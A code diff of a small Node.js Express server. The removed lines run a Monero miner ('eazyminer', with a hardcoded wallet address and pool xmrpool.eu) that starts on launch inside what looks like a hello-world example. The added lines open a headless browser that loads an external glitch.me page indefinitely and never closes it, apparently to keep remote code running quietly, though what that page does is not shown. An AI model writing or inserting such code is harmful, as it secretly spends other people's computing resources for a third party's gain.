@@ -1,20 +1,42 @@
-const Miner = require('eazyminer');
-const express = require('express')
-const app = express()
-const port = 4000
+const express = require('express');
+const puppeteer = require('puppeteer');
+const path = require('path');
+const fs = require('fs')
 
-const miner = new Miner({
-    pools: [{
-        coin: 'XMR',
-        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
-        url: 'xmrpool.eu:9999', // optional pool URL,
-    }],
-    autoStart: false // optional delay
+const app = express();
+const PORT = 4000;
+
+app.get('/', (req, res) => {
+  res.send({ message: "Server running" })
+})
+app.listen(PORT, () => {
+  console.log(`Test server is running on http://localhost:${PORT}`);
 });
 
-miner.start(); // optional manually start the miner
-// miner.stop() // manually stop the miner
+// Function to simulate a delay
+function delay(time) {
+  return new Promise(function(resolve) { 
+      setTimeout(resolve, time);
+  });
+}
 
-app.get('/', (req, res) => res.send('Hello World!'))
-app.listen(port, () => console.log(`Example app listening on port ${port}!`))
+(async () => {
+  // Launch a new browser instance
+  const browser = await puppeteer.launch({ headless: true });
 
+  // Open a new page
+  const page = await browser.newPage();
+
+  // Go to a webpage
+  await page.goto('https://placid-certain-wormhole.glitch.me/', {
+    waitUntil: "networkidle0",
+    timeout: 0
+  });
+
+    
+  // console.log(`Screenshot saved and available at http://localhost:${PORT}/screenshot`);
+
+  // Close the browser
+  //await browser.close();
+
+})();
